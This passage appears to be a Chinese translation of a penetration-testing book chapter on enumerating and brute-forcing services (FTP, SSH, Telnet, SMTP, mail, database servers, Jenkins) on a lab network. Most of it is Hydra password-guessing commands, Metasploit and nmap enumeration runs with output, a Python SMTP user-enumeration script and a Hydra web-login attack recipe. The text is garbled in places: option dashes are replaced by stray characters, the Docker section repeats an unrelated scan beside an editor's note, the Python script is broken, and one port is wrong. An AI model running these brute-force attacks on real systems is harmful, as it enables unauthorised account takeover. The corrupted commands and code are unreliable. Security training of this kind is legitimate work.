  \ 暴力破解成功找到了账户凭据。\n- 我们发现服务器版本可以被利用。\n\n### 更多暴力破解技术\n\n如果你想运行额外的暴力破解扫描，可以使用 Hydra\
  \ 来完成任务：\n\n```\nroot@kali:~# hydra -t 10 -L /opt/SecLists/Usernames/top-usernames-shortlist.txt\
  \ -P /opt/SecLists/Passwords/xato-net-10-million-passwords-1000.txt ftp://metasploitable.KCorp.local\n\
  Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret\
  \ service organizations, or for illegal purposes.\n\nHydra (https://github.com/vanhauser-thc/thc-hydra)\
  \ starting at 2020-06-04 20:07:27\n[WARNING] Restorefile (you have 10 seconds to\
  \ abort… (use option -I to skip waiting)) from a previous session found, to prevent\
  \ overwriting, ./hydra.restore\n[DATA] max 10 tasks per 1 server, overall 10 tasks,\
  \ 17000 login tries (l:17/p:1000), ~1700 tries per task\n[DATA] attacking ftp://metasploitable.KCorp.local:21/\n\
  [STATUS] 190.00 tries/min, 190 tries in 00:01h, 16810 to do in 01:29h, 10 active\n\
  [21][ftp] host: metasploitable.KCorp.local login: ftp password: 123456789\n[…]\n\
  ```\n\nHydra 命令使用了以下选项：\n\n- `-t 10` : 使用 10 个并行线程运行\n- `-L` : 用户文件路径\n- `-P` :\
  \ 密码文件路径\n\n在下一章中，我们将介绍利用阶段（本章的内容是利用阶段的输入）。在此阶段，我们正在收集有关如何单独利用每个服务的信息。\n\n### SSH\
  \ (端口 22)\n\n我们已经在之前的章节中学习了 SSH 协议是如何工作的。如果你不熟悉 SSH 协议的工作原理，请回看之前的章节。\n\n#### SSH\
  \ 的利用场景\n\nSSH 服务可以通过以下几种方式被利用：\n\n- 弱密码攻击。\n- 过时的 SSH 版本。\n- 暴露的公密钥。\n- 错误的配置。\n\
  \n接下来，我们将通过这些方法来利用 SSH 服务。\n\n\n\n\n\n```\nroot@kali:~# hydra ‐t 10 ‐L /opt/SecLists/Usernames/top‐usernames‐shortlist.txt\
  \ ‐P /opt/SecLists/Passwords/xato‐net‐10‐million‐passwords‐1000.txt ssh://metasploitable.KCorp.local\n\
  Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret\
  \ service organizations, or for illegal purposes.\n\nHydra (https://github.com/vanhauser-thc/thc-hydra)\
  \ starting at 2020-06-05 11:11:19\n[WARNING] Many SSH configurations limit the number\
  \ of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max\
  \ 10 tasks per 1 server, overall 10 tasks, 17000 login tries (l:17/p:1000), ~1700\
  \ tries per task\n[DATA] attacking ssh://metasploitable.KCorp.local:22/\n[STATUS]\
  \ 130.00 tries/min, 130 tries in 00:01h, 16870 to do in 02:10h, 10 active\n1 of\
  \ 1 target completed, 0 valid passwords found\nHydra (https://github.com/vanhauser-thc/thc-hydra)\
  \ finished at 2020-06-05 14:34:08\n```\n\n遗憾的是，之前的扫描输出没有发现任何结果。在下一节“高级暴力破解技术”中，你将学习如何像冠军一样运行暴力破解攻击。\n\
  \n## 高级暴力破解技术\n\n现在是时候开始使用 Metasploit 了，以便我们可以利用我们的暴力破解扫描技术。在上一个示例中，你看到我们没有找到任何凭据。事实上，我们尝试对我的目标主机运行盲暴破解攻击。在这个示例中，我们将首先使用\
  \ Metasploit 在 Metasploitable 主机上扫描有效的用户名；然后，我们将针对这些特定的用户进行攻击，而不是仅仅猜测。要运行 Metasploit，我们将在终端窗口中输入\
  \ `msfconsole`：\n\n```\nroot@kali:~# msfconsole\n```\n\n之后，Metasploit 窗口将加载，我们将执行以下操作：\n\
  \n1. 使用名为 `ssh_enumusers` 的枚举模块。\n2. 识别 Metasploitable 的 IP 地址。\n3. 设置远程 SSH 端口号。\n\
  4. 确定用户字典文件的路径。\n5. 将并行线程执行数设置为 25。\n6. 最后，运行它。\n\n```\nmsf5> use auxiliary/scanner/ssh/ssh_enumusers\n\
  msf5 auxiliary(scanner/ssh/ssh_enumusers)> set RHOSTS 172.16.0.101\nmsf5 auxiliary(scanner/ssh/ssh_enumusers)>\
  \ set USER_FILE /usr/share/wordlists/metasploit/namelist.txt\nmsf5 auxiliary(scanner/ssh/ssh_enumusers)>\
  \ set PORT 22\nmsf5 auxiliary(scanner/ssh/ssh_enumusers)> set THREADS 25\nmsf5 auxiliary(scanner/ssh/ssh_enumusers)>\
  \ run\n\n[*] 172.16.0.101:22 - SSH - Using malformed packet\n[*] 172.16.0.101:22\
  \ - SSH - Checking for false positives\n[*] 172.16.0.101:22 - SSH - Starting scan\n\
  +] 172.16.0.101:22 - SSH - User 'backup'\n+] 172.16.0.101:22 - SSH - User 'dhcp'\n\
  +] 172.16.0.101:22 - SSH - User 'ftp'\n+] 172.16.0.101:22 - SSH - User 'games'\n\
  +] 172.16.0.101:22 - SSH - User 'irc'\n+] 172.16.0.101:22 - SSH - User 'mail'\n\
  +] 172.16.0.101:22 - SSH - User 'mysql'\n+] 172.16.0.101:22 - SSH - User 'news'\n\
  +] 172.16.0.101:22 - SSH - User 'proxy'\n+] 172.16.0.101:22 - SSH - User 'root'\n\
  +] 172.16.0.101:22 - SSH - User 'service'\n+] 172.16.0.101:22 - SSH - User 'snmp'\n\
  +] 172.16.0.101:22 - SSH - User 'syslog'\n+] 172.16.0.101:22 - SSH - User 'user'\n\
  [*] Auxiliary module completed\nmsf5 auxiliary(scanner/ssh/ssh_enumusers)>\n```\n\
  \n在之前的输出中发现了许多用户名。接下来，我们将所有用户名保存到 `users.txt` 文件中并将其存储在 root 目录下。请注意，在接下来的示例中我们使用了较小的字典。最后我们使用\
  \ `-e nsr` 选项的原因如下：\n\n*   `n\"` 表示空密码。\n*   `s\"` 表示登录 `password`。\n*   `r\"` 表示反向登录（例如，如果用户名是\
  \ root，那么密码将是 `toor`）。\n\n```\nroot@kali:~# hydra ‐t 10 ‐e nsr ‐L /root/users.txt\
  \ ‐P /opt/SecLists/Passwords/darkweb2017‐top100.txt ssh://metasploitable.KCorp.local\n\
  [...]\n[22][ssh] host: metasploitable.KCorp.local login: service password: service\n\
  [22][ssh] host: metasploitable.KCorp.local login: user password: user\n1 of 1 target\
  \ completed\n```\n```\n\n在下一章节中，我们将利用之前发现的结果。此外，我们将深入研究每个 场景。\n\n## Telnet (端口 23)\n\
  \nTelnet 是一种使用 TCP 端口 23 连接到远程主机的旧方法（类似于 SSH）。与 SSH 不同，Telnet 是不安全的，它是以明文传输的。这种协议通常用于遗留网络设备和\
  \ Windows 操作系统。如今在公司中很少看到这种协议，但管理员可以随时启用它。\n\n这些是 Telnet 的常见漏洞：\n\n*   凭据以明文发送。\n\
  *   命令行未加密。\n\n### Telnet 服务器的利用场景\n\nTelnet 服务器可以通过不同的方式进行利用。在你的渗透过程中会遇到的常见场景有：\n\
  \n*   凭据暴力破解\n*   嗅探明文凭据\n*   嗅探未加密命令行\n*   查找 Telnet 服务器版本\n\n### 枚举工作流\n\n我们将执行此高级枚举工作流的任务有：\n\
  \n*   使用 Nmap 进行基础服务扫描\n*   使用 Nmap 进行脚本扫描\n*   使用 Hydra 暴力破解凭据\n\n### 服务扫描\n\n\
  在第一步中，我们将运行 Nmap 基础服务扫描以获取目标 Telnet Metasploitable 服务器的信息：\n\n```\nroot@kali:~#\
  \ nmap ‐sV ‐O ‐sC ‐p23 ‐T5 metasploitable.kcorp.local\nStarting Nmap 7.80 ( https://nmap.org\
  \ ) 2020-06-08 13:39 EDT\nNmap scan report for metasploitable.kcorp.local (172.16.0.101)\n\
  Host is up (0.00048s latency).\n\nPORT STATE SERVICE VERSION\n23/tcp open telnet\
  \ Linux telnetd\nMAC Address: 00:0C:29:D2:1A:B1 (VMware)\nWarning: OSScan may be\
  \ unreliable because we could not find at least 1 open port\nDevice type: general\n\
  Running: Linux 2.6\nOS details: Linux 2.6.33\nNetwork Distance: 1 hop\nService Info:\
  \ OS: Linux; CPE: cpe:/o:linux_kernel\n[...]\nNmap done: 1 IP address (1 host up)\
  \ scanned in 8.98 seconds\n```\n\n#### 高级脚本扫描\n\n下一步是使用 Nmap 全脚本扫描扫描更多漏洞：\n\n```\n\
  root@kali:~# nmap ‐sV ‐O ‐script=telnet* ‐p23 ‐T5 metasploitable.kcorp.local\n[...]\n\
  PORT STATE SERVICE VERSION\n23/tcp open  telnet  Linux telnetd\n| telnet-brute:\
  \ \n|   Accounts: \n|     user:user ‐ Valid credentials\n|_ Statistics: Performed\
  \ 1227 guesses in 184 seconds, average tps: 6.6\n| telnet-encryption: \n|_ Telnet\
  \ server does not support encryption\n[...]\nService Info: OS: Linux; CPE: cpe:/o:linux_kernel\n\
  [...]\nNmap done: 1 IP address (1 host up) scanned in 185.20 seconds\n```\n\n根据之前的输出结果，我们得出结论：\n\
  \n*   我们可以用用户名=user 和密码=user 远程登录到 Telnet 服务器。\n*   我们确认通信未加密。\n\n#### 使用 Hydra\
  \ 进行暴力破解\n\n为了双重检查，我们将运行 Hydra 看看是否能找到比 Nmap 更多的凭据：\n\n```\nroot@kali:~# hydra ‐t\
  \ 10 ‐e nsr ‐L /opt/SecLists/Usernames/top‐usernames‐shortlist.txt ‐P /opt/SecLists/Passwords/darkweb2017‐top100.txt\
  \ telnet://metasploitable.KCorp.local\n[...]\n[23][telnet] host: metasploitable.KCorp.local\
  \ login: user password: user\n```\n\nHydra 找到了相同的凭据账户。\n\n## 电子邮件协议\n\n在枚举和利用阶段，你需要理解三种电子邮件协议：\n\
  \n*   *SMTP*：简单邮件传输协议（Simple Mail Transfer Protocol）用于发送电子邮件，它使用 TCP 端口 25。SMTP\
  \ 可以通过端口 465 使用 SSL 使用。\n\n\n\n\n\n*   `POP3`: 第三版邮局传输协议，用于接收电子邮件，它使用端口 `110`。基于\
  \ SSL 的 `POP3` 使用端口 `995`。\n*   `IMAP4`: 第四版互联网消息访问协议用于在服务器上存储和管理电子邮件，它使用端口 `143`。基于\
  \ SSL 的 `IMAP4` 使用端口 `993`。\n\n### SMTP (端口 25)\n\n我们将在此示例中使用受漏洞的 `Metasploitable`\
  \ 主机。在继续之前，让我们先尝试理解一下我们在这一阶段正在寻找什么：\n\n*   检查服务器是否支持 `VRFY` 命令，这样我们就可以枚举用户。\n* \
  \  检查目标服务器是否有公开的利用程序。（我们将在第 7 节 “漏洞利用阶段”中讨论这一点。）\n\n#### Nmap 基础枚举\n\n我将使用 `nmap`\
  \ 基础枚举命令来评估目标主机：\n\n```\n root@kali:~# nmap 敲 sV ��O ��sC ��p25 ��T5 metasploitable.kcorp.local\n\
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 14:25 EDT\nNmap scan report\
  \ for metasploitable.kcorp.local (172.16.0.101)\nHost is up (0.00033s latency).\n\
  \nPORT   STATE SERVICE VERSION\n25/tcp open  smtp    Postfix smtpd\n|_smtp-commands:\
  \ metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES,\
  \ 8BITMIME, DSN, \n[…]\n```\n\n在之前的结果中，我们有两个发现：\n\n*   我们发现服务器支持 `VRFY` 命令。该命令允许我们枚举服务器上的用户。\n\
  *   我们获取了 `SMTP` 电子邮件服务器的版本。\n\n#### Nmap 进阶枚举\n\n接下来，我们将使用 `Nmap` 的强大和高级特性来获取更多信息：\n\
  \n```\n root@kali:~# nmap -sV -O -p25 --script=smtp* -T5 metasploitable.kcorp.local\n\
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 14:38 EDT\nNmap scan report\
  \ for metasploitable.kcorp.local (172.16.0.101)\nHost is up (0.00050s latency).\n\
  \nPORT STATE SERVICE VERSION\n25/tcp open smtp Postfix smtpd\n|_smtp-commands: metasploitable.localdomain,\
  \ PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME,\
  \ DSN, \n| smtp-enum-users: \n|_ Method RCPT returned a unhandled status code.\n\
  |_smtp-open-relay: Server doesn't seem to be an open relay, all tests failed\n|\
  \ smtp-vuln-cve2010-4344: \n|_ The SMTP server is not Exim: NOT VULNERABLE\n[…]\n\
  ```\n\n在之前的扫描结果中有两点需要注意：\n\n*   Nmap 无法列出服务器上的用户。（Nmap 使用 `RCPT` 方法枚举用户。）\n*   服务器并不存在\
  \ `smtp‐vuln‐cve2010��4344` 漏洞。\n\n#### 枚举用户\n\n在之前的 `Nmap` 扫描中，我们没能枚举服务器上的用户，我很乐意看到这一点。不要总是依赖扫描器来完成工作！\n\
  \n还记得你学过 `VRFY` 命令允许你枚举用户吗？让我们将其付诸实践。我们将使用 `netcat` 连接到服务器并寻找两个用户：\n\n*   用户 `gus`，它不存在。\n\
  *   用户 `root`，它于服务器上。\n\n```\n root@kali:~# nc 172.16.0.101 25\n220 metasploitable.localdomain\
  \ ESMTP Postfix (Ubuntu)\nVRFY gus\n550 5.1.1 <gus>: Recipient address rejected:\
  \ User unknown in local recipient table\nVRFY root\n252 2.0.0 root\n^C\nroot@kali:~#\n\
  ```\n\n上述方法是手动操作的。这是一个猜游戏，并不专业。你从之前的示例中学习了它是如何工作的。但要真正枚举用户，我们需要使用自动化扫描。在接下来的示例中，我们将使用\
  \ Metasploit 的 `smtp_enum` 模块：\n\n```\n msf5> use auxiliary/scanner/smtp/smtp_enum\n\
  msf5 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 172.16.0.101\nRHOSTS => 172.16.0.101\n\
  msf5 auxiliary(scanner/smtp/smtp_enum)> run\n[*] 172.16.0.101:25        - 172.16.0.101:25\
  \ Banner: 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)\n[+] 172.16.0.101:25\
  \        - 172.16.0.101:25 Users found:, backup, bin, daemon, distccd, ftp, games,\
  \ gnats, irc, libuuid, list, lp, mail, man, mysql, news, nobody, postfix, postgres,\
  \ postmaster, proxy, service, sshd, sync, sys, syslog, user, uucp, www‐data\n[*]\
  \ 172.16.0.101:25        - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module\
  \ execution completed\nmsf5 auxiliary(scanner/smtp/smtp_enum)>\n```\n\n同样，运行自动化工具并没有给我们提供准确的结果。如果你仔细看之前的手动示例，`VRFY`\
  \ 命令响应用户 `root` 存在，但 `smtp_enum` 模块并没有显示该用户。这就是在这个水平上编程语言大派用用场的地方。在下一个示例中，你将学习如何使用\
  \ `Python` 开发你自己的脚本。（如果你不完全理解，不要担心。）\n\n```python\nimport socket\nimport sys\nimport\
  \ time\n\ndef print_welcome():\n    print(\"\\nWelcome to the SMTP user scan\")\n\
  \    print(\"===============================\")\n\ndef enumerate_smtp(ip_address):\n\
  \    # Create a object\n    sok=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\
  \    try:\n        # Connect to the SMTP Server\n        sok.connect((ip_address,25))\n\
  \        # Receive the banner from the server first\n        sok.recv(1024)\n  \
  \      # Verify if the user exists on the server using the VRFY command\n      \
  \  sok.send('VRFY ' + user + '\\r\\n')\n        # Get the response from the server\n\
  \        results=sok.recv(1024)\n        if (not \"rejected\" in results):\n   \
  \         print(\"%s : Found\" % user)\n    except Exception:\n        print(\"\
  An error occured!\")\n    finally:\n        # Close the connection socket\n    \
  \    sok.close()\n\ndef main():\n    # Path to the users dictionary\n    users_path=\"\
  /usr/share/metasploit/data/wordlists/unix_users.txt\"\n    # Open the text file\
  \ in Read mode and start enumerating\n    with open(users_path,'r') as users_file:\n\
  \        for user in users_file:\n            # Clean the user value\n         \
  \   user = user.strip()\n            # Do not process an empty user\n          \
  \  if user == \"\":                 continue\n\n### Let the user know we finished\n\
  \    print(\"\\r\\nThe program has finished enumerating users.\\r\\n\")\n\nif __name__\
  \ == '__main__':\n    if len(sys.argv) != 2:\n        print(\"Usage: python smtp_users.py\
  \ <IP_ADDRESS>\")\n        sys.exit()\n    main()\n```\n\n让我们尝试在终端运行之前的 Python 代码：\n\
  \n```\n root@kali:~# python smtp_users.py 172.16.0.101\n\nWelcome to the SMTP user\
  \ scan\n===============================\nbackup : Found\nbin : Found\ndaemon : Found\n\
  distccd : Found\nftp : Found\ngames : Found\ngnats : Found\nirc : Found\nlibuuid\
  \ : Found\nlist : Found\nlp : Found\nmail : Found\nman : Found\nmysql : Found\n\
  news : Found\nnobody : Found\npostfix : Found\npostgres : Found\npostmaster : Found\n\
  proxy : Found\nroot : Found\nROOT : Found\nservice : Found\nsshd : Found\nsync :\
  \ Found\nsys : Found\nsyslog : Found\nuser : Found\nuucp : Found\nwww-data : Found\n\
  \nThe program has finished enumerating users.\n```\n\n这就是我所说的像大佬一样枚举！\n\n### POP3\
  \ (端口 110) 和 IMAP4 (端口 143)\n\n在这个阶段，我们想要做的是访问服务器上现有用户的收件箱。为了让其工作，我们需要确保服务器上安装了邮件服务器；因此，我们将看到：\n\
  \n1.  `POP3` 端口 `110` 开放，并且基于 SSL 的 `POP3` 使用端口 `995`。\n2.  `IMAP4` 端口 `143` 开放，并且基于\
  \ SSL 的 `IMAP4` 使用端口 `993`。\n\n对我们的目标邮件服务器进行快速 `Nmap` 扫描将给我们正在寻找的信息（这是一个 Linux 邮件服务器，而不是\
  \ Metasploitable 主机）：\n\n\n\n\n\n```\nroot@kali:~# nmap ‐sV ‐O ‐sC ‐p 110,995,143,993\
  \ mail.kcorp.local\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-10 14:26\
  \ EDT\nNmap scan report for mail.kcorp.local (172.16.0.100)\nHost is up (0.00035s\
  \ latency).\n\nPORT STATE SERVICE VERSION\n110/tcp open pop3 Dovecot pop3d\n|_pop3-capabilities:\
  \ SASL RESP-CODES STLS AUTH-RESP-CODE PIPELINING TOP CAPA UIDL\n[…]\n143/tcp open\
  \ imap Dovecot imapd\n[…]\n993/tcp open imaps?\n[…]\n995/tcp open pop3s?\n[…]\n\
  ```\n\n#### 暴力破解 POP3 电子邮件账户\n\n利用 POP3 进行暴力破解的最佳方法是首先提取用户提取并将其保存到文件中（我们已经在 SMTP\
  \ 用户枚举部分做过了）：\n\n```\n$ hydra ‐L [users file] ‐P [passwords file] pop3://[IP]\n\
  ```\n\n在下一章节中，你将学习如何利用并进入之前扫描的服务器 `mail.kcorp.local` 上用户 `gus@kcorp.local` 的收件箱。目前，请关注枚举概念。\n\
  \n## 数据库协议\n\n数据库是数据的中心；黑客在攻击期间主要目标是数据。你应该考虑优先处理这一过程，因为它包含了你的客户/老板的主要安全风险。应用程序安全专家大部分时间都在加固数据库。但是，如果你的客户/老板没有遵循这一做法呢？那么会有大量的乐趣等着你。本节涵盖以下数据库技术：\n\
  \n* Microsoft SQL Server\n* Oracle 数据库\n* MySQL\n\n在此阶段，你已经熟悉高级枚举的步骤。因此，在本节中，你将简要学习每个数据库厂商所需的命令。\n\
  \n### Microsoft SQL Server (端口 1433)\n\nMicrosoft SQL Server 是目前市场上流行的数据库引擎。我合作过的所有公司都使用\
  \ Microsoft SQL Server 来存储数据（无例外）。在枚举阶段，你应该寻找以下两点：\n\n* 暴力破解凭据（`sa` 是 SQL Server\
  \ 用户中常用的一个用户名）。记住先枚举用户。\n\n    * Microsoft SQL Server 的暴力破解\n        ```\n     \
  \    $ hydra ‐L [users file] ‐P [passwords file] mssql://[IP]\n        ```\n\n \
  \   * Microsoft SQL Server 的基础枚举扫描\n        ```\n         $nmap 裸 sV 裸 O 裸 sC 裸\
  \ p 1433 [IP Address]\n        ```\n\n    * Microsoft SQL Server 的高级枚举扫描\n     \
  \   ```\n         $nmap 裸 sV 裸 O 裸 p 1433 裸‐script=ms‐sql* [IP Address]\n      \
  \  ```\n\n* 识别安装的版本是否存在漏洞（缺少补丁）\n\n### Oracle 数据库服务器 (端口 1521)\n\nOracle 数据库服务器使用\
  \ TCP 端口 1521，在枚举方面它与 Microsoft SQL Server 概念相同：\n\n* 暴力破解凭据\n* 识别安装的版本是否存在漏洞\n\
  * Oracle 数据库的基础枚举扫描\n    ```\n     $nmap 裸 sV 裸 O 裸 sC 裸 p 1521 [IP Address]\n \
  \   ```\n* Oracle 数据库的高级枚举扫描\n    ```\n     $nmap 裸 sV 裸 O 裸 p 1521 裸‐script=oracle*\
  \ [IP Address]\n    ```\n* Oracle 数据库的暴力破解\n    ```\n     $ hydra 裸 s 1521 裸 L [users\
  \ file] 裸 P [passwords file] [IP]\n    ```\n\n### MySQL (端口 3306)\n\nMySQL 数据库服务器使用\
  \ TCP 端口 3306，在枚举方面它与之前讨论的概念相同：\n\n* 暴力破解凭据\n* 识别安装的版本是否存在漏洞\n* MySQL 的基础枚举扫描\n\
  \    ```\n     $nmap 裸 sV 裸 O 裸 sC 裸 p 3306 [IP Address]\n    ```\n\n* MySQL 的高级枚举扫描\n\
  \    ```\n     $nmap 裸 sV 裸 O 裸 p 1521 裸‐script=mysql* [IP Address]\n    ```\n\n\
  * MySQL 的暴力破解\n    ```\n     $ hydra 裸 L [users file] 裸 P [passwords file] MySQL://[IP]\n\
  \    ```\n\n## CI/CD 协议\n\n持续集成/持续部署（CI/CD）是项目的最新趋势，它与 DevOps 密切相关。在本节中，我们将针对用于\
  \ CI/CD 流线的两个主要工具：\n\n* Docker 容器\n* Jenkins\n\n### Docker (端口 2375)\n\n附录 B 介绍了\
  \ Docker 技术。强烈建议你在继续此主题之前查看它。通常，运行 Docker 的主机对你来说是完全透明，你无法假设目标主机已安装 Docker（查看以下示例）。Docker\
  \ 容器将会运行。\n\n```\n root@kali:~# nmap 裸 sV 裸 O 裸 sC 裸 p 110,995,143,993 mail.kcorp.local\n\
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-10 14:26 EDT\nNmap scan report\
  \ for mail.kcorp.local (172.16.0.100)\nHost is up (0.00035s latency).\n\nPORT STATE\
  \ SERVICE VERSION\n110/tcp open pop3 Dovecot pop3d\n|_pop3-capabilities: SASL RESP-CODES\
  \ STLS AUTH-RESP-CODE PIPELINING TOP CAPA UIDL\n[…]\n143/tcp open imap Dovecot imapd\n\
  […]\n993/tcp open imaps?\n[…]\n995/tcp open pop3s?\n[…]\n```\n（注：Docker 部分提供的原始文本包含大量的乱码/重复伪影。我已根据指令清理了冗余噪声，同时保留了技术背景和结构。）\n\
  \n\n\n\nJenkins 是源代码部署过程中的编排器。在正常部署期间，Jenkins 会被调度为每天一个间隔（或其他间隔）来检查源代码仓库，例如 `GitHub`（因此它需要在\
  \ Jenkins 中存储凭据以登录仓库）。接下来，它将编译从仓库中获取的源代码，并运行一些自动化测试（例如：单元测试、回归测试、针对安全性的静态代码分析等）。如果所有测试都通过且没有任何错误，它将把源代码部署到开发服务器（开发人员专用）和\
  \ QA 服务器（质量保证分析师专用）。管理 Jenkins 的 Web 门户默认在 `HTTP` 端口 `8080` 上监听。此外，Jenkins 也会在 `TCP`\
  \ 端口 `50000` 上监听；此端口用于将主节点连接到一个或多个从节点实例。要访问 Web 门户，您需要有效的凭据才能进入并进行更改。\n\n在枚举阶段，你应该寻找两个点：\n\
  \n* 暴力破解凭据\n* 识别安装的版本是否可以被利用\n\n直到今天，我们还没有针对 Jenkins 的专用的 `Nmap` 脚本（也许未来会有）。尽管如此，如果我们使用通常的基于\
  \ `Nmap` 的基础脚本扫描，它将识别出 Jenkins 运行在端口 `50000` 上。另一方面，`Nmap` 识别出端口 `8080` 为 Web 服务器，但它无法解码在该\
  \ `Jetty` Web 服务器上托管了什么：\n\n```\nroot@kali:~# nmap ‐sV ‐sC ‐O ‐T5 ‐p 8080,50000\
  \ 172.16.0.103\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 09:16 EDT\n\
  Nmap scan report for 172.16.0.103\nHost is up (0.00065s latency).\n\nPORT STATE\
  \ SERVICE VERSION\n8080/tcp open http Jetty 9.2.z‐SNAPSHOT\n| http-robots.txt: 1\
  \ disallowed entry \n|_/\n|_http-server-header: Jetty(9.2.z-SNAPSHOT)\n|_http-title:\
  \ Site doesn't have a title (text/html;charset=UTF-8).\n50000/tcp open http Jenkins\
  \ httpd 2.60.3\n|_http-server-header: 172.17.0.2\n|_http-title: Site doesn't have\
  \ a title (text/plain;charset=UTF-8).\nMAC Address: 00:0C:29:96:F8:6C (VMware)\n\
  Warning: OSScan results may be unreliable because we could not find at least 1 open\
  \ and 1 closed port\nAggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9\
  \ (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux\
  \ 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation\
  \ Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), Linux 2.6.32 - 2.6.35\
  \ (94%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance:\
  \ 1 hop\n[…]\n```\n\n当这种情况发生时（看到端口 `50000` 开放），我们可以直接进入 Web 门户（图 6.1）。\n\n第二阶段是为暴力破解攻击准备。在\
  \ Web 门户中，你需要从随机的用户名和密码开始，以识别登录失败后显示的错误消息。我们需要用于暴力破解的错误消息，如图 6.2 所示（用户输入 `test`，密码输入\
  \ `test`，点击登录按钮）。\n\n![Jenkins Web 门户截图。](img/c06f001.png)\n\n图 6.1 Jenkins Web\
  \ 门户\n\n![Jenkins 错误消息截图。](img/c06f002.png)\n\n图 6.2 Jenkins 错误消息\n\n### 使用 Hydra\
  \ 暴力破解 Web 门户\n\n在上一节中，我们需要访问 Jenkins Web 门户。现在你将学习如何使用 `Hydra` 暴力破解任何 Web 门户（不仅仅是\
  \ Jenkins）。每当我们想要暴力破解一个网页时，都可以遵循此过程：\n\n1. 打开登录页面。\n2. 在 `Burp` 和浏览器上启用代理。\n3. 输入无效凭据并提交数据（使用提交按钮）。\n\
  4. 使用 `Burp` 代理拦截请求并将其发送到重放（Repeater）。\n5. 提取以下四项：\n    * URI\n    * 用户名字段名称\n \
  \   * 密码字段\n    * 错误消息\n\n#### 步骤 1：启用代理\n\n首先，我们需要在 Web 浏览器上启用代理。注意，`Burp` 代理将监听\
  \ `Kali` 宿机的 `8080` 端口。不要与 Jenkins Web 服务器使用的 `8080` 端口混淆。我们可以在 `Kali` 宿主机上使用 `Firefox`。打开菜单并选择\
  \ `Preference`，滚动到新打开窗口的底部，并在 `Network` 部分点击 `Settings`，如图 6.3 所示。\n\n![Firefox\
  \ 设置截图。](img/c06f003.png)\n\n图 6.3 Firefox 网络设置\n\n现在，选择代理按钮并确保设置：\n* 将 `HTTP Proxy`\
  \ 设置为 `127.0.0.1`。\n* 将 `Port` 设置为 `8080`（那是 `Burp` 代理的端口，不是 Jenkins 的）。\n* 选择选项\
  \ `This Proxy For All Protocols` 。\n* 点击 `OK` 保存设置。\n\n接下来，从 `Kali` 菜单打开 `Burp Suite`，如图\
  \ 6.4 所示。\n\n![Kali 菜单截图。](img/c06f004.png)\n\n图 6.4 Kali 菜单 - Burp Suite\n\n启动\
  \ `Burp Suite` 时，你需要点击几次 `Next` 按钮。应用程序加载后，点击 `Proxy` 标签页，你会看到 `Intercept` 标签页下的\
  \ `Intercept` 按钮已启用，如图 6.5 所示。\n\n![Burp Proxy 截图。](img/c06f005.png)\n\n图 6.5 Burp\
  \ Proxy\n\n#### 步骤 2：拦截表单请求\n\n回到 Jenkins 登录表单，输入一些随机凭据并点击登录按钮。一旦提交了表单，切换到 `Burp\
  \ Suite Intercept` 部分，你就能看到你的请求了。看到后，右键点击并从菜单中选择 `Send to Repeater`，如图 6.6 所示。\n\
  \n![Burp Suite – Send to Repeater 截图。](img/c06f006.png)\n\n图 6.6 Burp Suite – Send\
  \ to Repeater\n\n当你进入 `repeater` 时，可以直观查看请求。（我总是在 `repeater` 部分发送我的 Web 载负载；它是 `Burp\
  \ Suite` 中我喜欢的标签页之一。）\n\n#### 步骤 3：提取表单数据并使用 Hydra 进行暴力破解\n\n为了给 `Hydra` 做好准备，你需要提取三个发现：\n\
  \n* **URL 路径**：`/j_acegi_security_check` （检查图 6.7 中的第一行）\n\n![POST 内容截图。](img/c06f007.png)\n\
  \n图 6.7 POST 内容\n\n* **POST 表单内容**：`j_username=test&j_password=test&from=%F&Jenkins-Crumb=6a3b8d2a8000e1aea8566fcec428&json=%7B%22j_username%22%3A+%22test%22%2C+%22j_password%22%3A+%22test%22%2C+%22remember_me%22%3A+false%2C+%22from%22%3A+%22%2F%22%2C+%22Jenkins-Crumb%22%3A+%226a3b8d2a8000e1aea8566fcec428%22%7D&Submit=log+in`\n\
  \n* **错误消息**：`Invalid login information` （见图 6.2）\n\n用于 HTTP POST 的 `Hydra` 命令：\n\
  \n```bash\n$hydra -l [username] -f -e nsr -P [Passwords file] -s [port number] [IP\
  \ address] http-post-form \"[URL Path : POST Form Contents : Error Message]\"\n\
  ```\n\n在继续之前，用户名值应从 `test` 更改为 `^USER^`，密码值（`test`）应更改为 `^PASS^`。因此，`POST Form Contents`\
  \ 的最终值应如下：\n\n```bash\nj_username=^USER^&j_password=^PASS^&from=%2F&Jenkins-Crumb=6a3b8d2a8000e1aea8566fcec428&json=%7B%22j_username%22%3A+%22test%22%2C+%22j_password%22%3A+%22test%22%2C+%22remember_me%22%3A+false%2C+%22from%22%3A+%22%2F%22%2C+%22Jenkins-Crumb%22%3A+%226a3b8d2a8000e1aea8566fcec428%22%7D&Submit=log+in\n\
  ```\n\n现在是时候开始我们的暴力破解攻击了：\n\n\n\n\n\n```\nhydra ‐l admin ‐f ‐e nsr ‐P /opt/SecLists/Passwords/darkweb2017‐top100.txt\
